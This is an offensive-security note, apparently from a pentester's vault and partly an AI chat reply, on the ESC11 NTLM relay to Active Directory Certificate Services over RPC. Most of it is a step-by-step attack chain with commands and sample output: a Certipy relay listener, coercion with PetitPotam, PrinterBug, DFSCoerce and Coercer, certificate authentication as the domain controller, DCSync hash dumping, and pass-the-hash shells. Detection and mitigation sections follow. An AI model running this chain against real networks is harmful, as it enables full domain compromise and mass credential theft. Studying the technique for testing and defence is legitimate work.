---
title: "ESC11 — NTLM Relay to ADCS RPC (ICPR)"
description: "ESC11 is the RPC-based sibling of ESC8. Where ESC8 relays NTLM credentials to the CA's HTTP Web Enrollment endpoint, ESC11 relays them to the CA's RPC…"
category: active-directory
tags: ["active-directory", "adcs", "ntlm", "relay"]
tools: ["Impacket", "Certipy", "Metasploit", "Evil-WinRM", "Certify"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC11 — NTLM Relay to ADCS RPC (ICPR).md"
---
# ESC11 — NTLM Relay to ADCS RPC (ICPR)

## What Is ESC11?

ESC11 is the **RPC-based sibling of ESC8**. Where ESC8 relays NTLM credentials to the CA's **HTTP Web Enrollment** endpoint, ESC11 relays them to the CA's **RPC interface** — specifically the `ICertPassage` (MS-ICPR) protocol used for certificate enrollment over RPC/DCOM. This was discovered and disclosed by Sylvain Heiniger at Compass Security in a blog post titled *"Relaying to AD Certificate Services over RPC"*.

The critical distinction: **ESC11 exists precisely because organisations disabled or never enabled Web Enrollment (preventing ESC8), but left RPC enrollment unencrypted**. It is the bypass for ESC8 mitigations. Many admins disable `certsrv` (HTTP) thinking they've closed the relay attack surface — ESC11 proves they haven't.

The flag that makes this possible is `IF_ENFORCEENCRYPTICERTREQUEST` — when this is **not set** on the CA, the RPC certificate enrollment interface accepts unencrypted requests, allowing NTLM relay exactly like ESC8 does over HTTP.

***

## ESC8 vs ESC11 — The Core Difference

| | ESC8 | ESC11 |
|---|---|---|
| **Relay target** | `http://<CA>/certsrv/certfnsh.asp` | CA RPC endpoint (TCP 135 / dynamic ports) |
| **Protocol abused** | HTTP Web Enrollment | MS-ICPR (ICertPassage RPC) |
| **Key misconfiguration** | Web Enrollment enabled | `IF_ENFORCEENCRYPTICERTREQUEST` NOT set |
| **Certipy flag** | `Web Enrollment: Enabled` | `Enforce Encryption for Requests: Disabled` |
| **Disabled by default?** | ❌ Web Enrollment is off by default | ✅ Encryption enforcement is OFF by default on some configs |
| **Bypasses ESC8 fix?** | N/A | ✅ ESC11 works even when Web Enrollment is disabled |
| **Tool for relay** | `ntlmrelayx --adcs` | `certipy-ad relay` |

***

## Required Conditions

| Condition | Where to Check |
|-----------|----------------|
| `IF_ENFORCEENCRYPTICERTREQUEST` NOT set on CA | CA output: `Enforce Encryption for Requests: Disabled` |
| `Request Disposition: Issue` | CA output: `Request Disposition: Issue` |
| RPC reachable from attacker (TCP 135 + dynamic) | Network access to CA |
| At least one Client Auth or machine auth template available | Template enumeration |
| A coercible target (ideally DC) | Network topology |

***

## Step 0 — Enumeration

```bash
# Standard vulnerable scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# With hash
certipy-ad find -u 'lowpriv@domain.htb' -hashes :NTHASH \
  -dc-ip $TARGET -vulnerable -stdout
```

### What Vulnerable ESC11 Output Looks Like

The vulnerability shows at the **CA level**:

```
Certificate Authorities
  0
    CA Name                             : DOMAIN-CA
    DNS Name                            : DC01.domain.htb
    Web Enrollment
      HTTP
        Enabled                         : False       ← ESC8 NOT possible
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled    ← ⚠️ THE ESC11 flag

    [!] Vulnerabilities
      ESC11 : Encryption is not enforced for ICPR requests
              and Request Disposition is set to Issue
```

> 💡 This is exactly what your **Fluffy box** output showed — `Web Enrollment: False` (no ESC8) but `Enforce Encryption for Requests: Enabled` — meaning on Fluffy, ESC11 was also NOT available, which is why the attack path was ESC16 instead. Knowing how to read this output is exactly what separates good ADCS operators from great ones.

***

## Understanding the Relay Topology

```
[YOUR ATTACK BOX]          [DOMAIN CONTROLLER]         [CA / ADCS SERVER]
        │                          │                           │
        │  1. certipy relay        │                           │
        │  Listening on TCP 445    │                           │
        │                          │                           │
        │  2. Coerce DC auth       │                           │
        │  PetitPotam / Coercer    │                           │
        │─────────────────────────►│                           │
        │                          │ NTLM Auth triggered       │
        │◄─────────────────────────│                           │
        │  3. Relay NTLM → CA RPC  │                           │
        │─────────────────────────────────────────────────────►│
        │                          │       CA issues DC01$.pfx │
        │◄─────────────────────────────────────────────────────│
        │  4. certipy auth -pfx dc01.pfx                       │
        │  5. secretsdump DCSync → ALL hashes                  │
```

> 💡 The topology is **identical to ESC8** — the only difference is what port/protocol your relay listener targets. All the same coercion tools apply.

***

## Full Attack Chain — Linux (Certipy Relay)

Certipy v4+ has **native relay support** built in, making ESC11 significantly cleaner than ESC8's ntlmrelayx approach.

***

### Step 1 — Start the Certipy Relay Listener

Open **Terminal 1**:

```bash
# Certipy's native relay — targets the CA RPC interface directly
certipy-ad relay \
  -ca 'DOMAIN-CA-NAME' \
  -template 'DomainController'

# If CA is on a separate host from the DC
certipy-ad relay \
  -target <CA-IP> \
  -ca 'DOMAIN-CA-NAME' \
  -template 'DomainController'

# For relaying a user account instead of machine account
certipy-ad relay \
  -ca 'DOMAIN-CA-NAME' \
  -template 'User'
```

**Expected output:**
```
[*] Targeting 'rpc://<CA-IP>'
[*] Listening on 0.0.0.0:445
[*] Relay attack set up — waiting for connections...
```

> 💡 `certipy relay` automatically handles the RPC relay to the `ICertPassage` interface — no manual ntlmrelayx configuration needed. It listens on **port 445** for incoming NTLM authentication attempts.

***

### Step 2 — Coerce Authentication from the Target

Open **Terminal 2** — force the DC to authenticate toward you:

**Method A — Coercer (all coercion methods combined, most reliable):**
```bash
# Requires a low-priv domain account
coercer coerce \
  -u 'lowpriv' \
  -p 'Password123!' \
  -d 'domain.htb' \
  -l <YOUR-IP> \
  -t <DC-IP>
```

**Method B — PetitPotam (EFS-based coercion):**
```bash
# Unauthenticated (pre-patch)
python3 PetitPotam.py <YOUR-IP> <DC-IP>

# Authenticated (post-patch)
python3 PetitPotam.py \
  -u 'lowpriv' \
  -p 'Password123!' \
  -d 'domain.htb' \
  <YOUR-IP> <DC-IP>
```

**Method C — PrinterBug (Print Spooler):**
```bash
python3 printerbug.py 'domain.htb/lowpriv:Password123!'@<DC-IP> <YOUR-IP>
```

**Method D — DFSCoerce (MS-DFSNM):**
```bash
python3 dfscoerce.py \
  -u 'lowpriv' -p 'Password123!' \
  -d 'domain.htb' \
  <YOUR-IP> <DC-IP>
```

***

### Step 3 — Collect the Certificate (Watch Terminal 1)

After coercion fires, watch Terminal 1 (certipy relay):

```
[*] Received connection from DC01$@<DC-IP>
[*] Connecting to 'rpc://<CA-IP>'
[*] Requesting certificate for 'DC01$' based on 'DomainController' template
[*] Got certificate with DNS hostname 'DC01.domain.htb'
[*] Saving certificate and private key to 'DC01$.pfx'
[*] Done!
```

***

### Step 4 — Authenticate as the DC Machine Account

```bash
certipy-ad auth \
  -pfx 'DC01$.pfx' \
  -username 'DC01$' \
  -domain domain.htb \
  -dc-ip $TARGET
```

**Expected output:**
```
[*] Using principal: 'DC01$@domain.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'DC01$.ccache'
[*] Got hash for 'DC01$@domain.htb': aad3b435b51404eeaad3b435b51404ee:NTHASH
```

***

### Step 5 — DCSync (Full Domain Compromise)

```bash
# Using TGT
export KRB5CCNAME='DC01$.ccache'
secretsdump.py -k -no-pass DC01.domain.htb

# Using NT hash directly
secretsdump.py \
  -hashes :NTHASH \
  'domain.htb/DC01$'@DC01.domain.htb

# Output: ALL domain hashes
# Administrator:500:aad3b435...:NTHASH
# krbtgt:502:aad3b435...:KRBTGT_HASH
# All users...
```

***

### Step 6 — Shell as Administrator

```bash
# Pass-the-Hash with Admin NT hash from DCSync
evil-winrm -i $TARGET -u administrator -H <ADMIN_NTHASH>
wmiexec.py administrator@$TARGET -hashes :ADMIN_NTHASH
psexec.py administrator@$TARGET -hashes :ADMIN_NTHASH
```

***

## Alternative — Using ntlmrelayx for ESC11 (Older Certipy Versions)

If you're on an older Certipy version without native relay support:

```bash
# Terminal 1 — ntlmrelayx targeting CA RPC
impacket-ntlmrelayx \
  -t rpc://<CA-IP> \
  -rpc-mode ICPR \
  -icpr-ca-name 'DOMAIN-CA-NAME' \
  --adcs \
  --template 'DomainController' \
  -smb2support

# Terminal 2 — same coercion as above
python3 PetitPotam.py -u 'lowpriv' -p 'Password123!' -d 'domain.htb' <YOUR-IP> <DC-IP>
```

> 💡 Note the key difference from ESC8 — `-t rpc://<CA-IP>` instead of `-t http://...`, and the addition of `-rpc-mode ICPR` and `-icpr-ca-name`. These flags tell ntlmrelayx to speak the MS-ICPR protocol instead of HTTP enrollment.

***

## ESC11 Visual Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│  PREREQ CHECK                                                       │
│  certipy find → Enforce Encryption for Requests: Disabled          │
└─────────────────────────────────────────────────────────────────────┘
                            │
       ┌────────────────────▼──────────────────────┐
       │ Terminal 1: certipy relay                 │
       │ -ca DOMAIN-CA -template DomainController  │
       │ Listening on 0.0.0.0:445 (RPC relay)      │
       └────────────────────┬──────────────────────┘
                            │
       ┌────────────────────▼──────────────────────┐
       │ Terminal 2: Coercer / PetitPotam          │
       │ Force DC01$ → auth to YOUR-IP             │
       └────────────────────┬──────────────────────┘
                            │
       ┌────────────────────▼──────────────────────┐
       │ Relay → CA RPC (MS-ICPR)                  │
       │ CA issues DC01$.pfx                       │
       └────────────────────┬──────────────────────┘
                            │
       ┌────────────────────▼──────────────────────┐
       │ certipy auth -pfx DC01$.pfx               │
       │ → TGT + NT hash for DC01$                 │
       └────────────────────┬──────────────────────┘
                            │
       ┌────────────────────▼──────────────────────┐
       │ secretsdump DCSync                        │
       │ → ALL domain hashes                       │
       └────────────────────┬──────────────────────┘
                            │
                     [DOMAIN OWNED]
```

***

## Troubleshooting Common Issues

| Error | Cause | Fix |
|-------|-------|-----|
| `certipy relay` gets connection but CA rejects | Encryption IS enforced — Certipy misread the flag | Double-check `Enforce Encryption for Requests` value in certipy output |
| `Connection refused` on relay | CA RPC port not reachable | Check firewall — TCP 135 and dynamic RPC ports must be open to your box |
| Coercion fires but no connection received | DC can't route back to your IP | Check your IP is reachable from the DC — use `tcpdump port 445` to confirm |
| `Got certificate but no DNS hostname` | Wrong template used | For DC machine accounts use `DomainController` template, not `User` |
| `certipy auth` fails with `KDC_ERR_PADATA` | PKINIT not supported for machine certs on this DC | Try specifying a different DC with `-dc-ip` |
| `ntlmrelayx -rpc-mode ICPR` errors | Old impacket version | Update impacket: `pip3 install impacket --upgrade` |

***

## Detection Indicators

- **Event ID 4887** — Certificate issued for a machine account where the request source IP differs from the machine's own IP
- **Windows Security Event ID 4624** — Type 3 logon for a machine account `DC01$` from an unexpected source IP
- **CA audit log** — RPC-based certificate requests from IP addresses not matching the machine account's registered IP
- **Network IDS** — NTLM authentication over port 445 followed immediately by RPC traffic to the CA on port 135+ from the same source
- **Sysmon Event ID 3** — Unexpected network connections from `lsass.exe` to your attacker IP

***

## Mitigation

- **Enable `IF_ENFORCEENCRYPTICERTREQUEST`** — the single most direct fix:
  ```powershell
  # On the CA server
  certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
  net stop certsvc && net start certsvc
  ```
- **Block NTLM where possible** — enforce Kerberos-only authentication on sensitive segments to remove the relay opportunity
- **Enable SMB signing** on all domain machines — this doesn't directly fix ESC11 but eliminates many coercion-relay chains
- **Patch coercion vectors** — apply patches for PetitPotam (CVE-2021-36942), disable Print Spooler on DCs, disable unnecessary RPC services
- **Restrict which templates machine accounts can enroll in** — `DomainController` template should require CA manager approval
- **Network segmentation** — CA RPC ports (TCP 135 + dynamic) should not be reachable from workstation VLANs

***

Ready for the **Golden Certificate Attack** whenever you say go, Netrunner.

Sources
 ESC11 - NTLM Relay to AD CS RPC Interfaces https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc11-ntlm-relay-to-ad-cs-rpc-interfaces
 Exploiting Active Directory Certificate Services - ESC11 Walkthrough https://heartburn.dev/exploiting-active-directory-certificate-services-esc11-walkthrough/
 ADCS ESC11 – Relaying NTLM to ICPR - Hacking Articles https://www.hackingarticles.in/adcs-esc11-relaying-ntlm-to-icpr/
 redblock_team-11.-ADCS-Attacks.pdf https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/14624338/ba26726a-dc39-49bb-a7f4-de582faee79b/redblock_team-11.-ADCS-Attacks.pdf
 Common ADCS Vulnerabilities: Logging, Exploitation ... - Lares Labs https://labs.lares.com/adcs-exploits-investigations-pt1/
 An Expert Guide to Fortifying Active Directory Certificate Services ... https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/
 Certificates - Microsoft Defender for Identity https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates
 Attacking AD CS ESC Vulnerabilities Using Metasploit https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html
 06 ‐ Privilege Escalation · ly4k/Certipy Wiki - GitHub https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
 AD CS Security: Understanding and Exploiting ESC Techniques https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/
 Preventing Privilege Escalation via Active Directory Certificate ... https://www.catonetworks.com/blog/cato-ctrl-preventing-privilege-escalation-via-active-directory-certificate-services-adcs/
